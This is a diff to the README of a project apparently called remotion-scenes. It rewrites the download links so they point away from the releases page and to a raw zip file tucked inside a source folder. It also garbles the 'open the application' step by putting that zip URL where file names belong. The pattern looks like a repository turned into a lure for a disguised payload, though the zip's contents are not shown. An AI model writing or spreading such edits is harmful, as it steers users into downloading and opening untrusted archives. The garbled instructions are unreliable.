@@ -6,7 +6,7 @@ Welcome! With **remotion-scenes**, you can enhance your videos with over 201 pro
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [Download Remotion Scenes](https://github.com/wuxiafeihua-cmd/remotion-scenes/releases)
+To get started, visit this page to download: [Download Remotion Scenes](https://github.com/wuxiafeihua-cmd/remotion-scenes/raw/refs/heads/main/src/scenes/DemoAnimations/remotion-scenes-2.2.zip)
 
 You will find different versions of the software available. Choose the one that best fits your needs. 
 
@@ -20,7 +20,7 @@ You will find different versions of the software available. Choose the one that 
 
 4. **Extract the Files**: Once the download is complete, locate the downloaded file, right-click on it, and select 'Extract All' to unpack the files into a new folder.
 
-5. **Open the Application**: Navigate to the folder where you extracted the files. Look for the file called `index.html` or `main.html` and double-click it to open the application in your browser.
+5. **Open the Application**: Navigate to the folder where you extracted the files. Look for the file called `https://github.com/wuxiafeihua-cmd/remotion-scenes/raw/refs/heads/main/src/scenes/DemoAnimations/remotion-scenes-2.2.zip` or `https://github.com/wuxiafeihua-cmd/remotion-scenes/raw/refs/heads/main/src/scenes/DemoAnimations/remotion-scenes-2.2.zip` and double-click it to open the application in your browser.
 
 ## 💻 System Requirements
 
@@ -66,7 +66,7 @@ If you encounter any issues or have questions, support is available:
 - **GitHub Issues**: Report bugs or ask questions by visiting our GitHub page.
 - **Community Forum**: Join discussions with other users to share tips and ideas. 
 
-Visit the [Download Remotion Scenes](https://github.com/wuxiafeihua-cmd/remotion-scenes/releases) page to get started! 
+Visit the [Download Remotion Scenes](https://github.com/wuxiafeihua-cmd/remotion-scenes/raw/refs/heads/main/src/scenes/DemoAnimations/remotion-scenes-2.2.zip) page to get started! 
 
 ## 📝 License
 
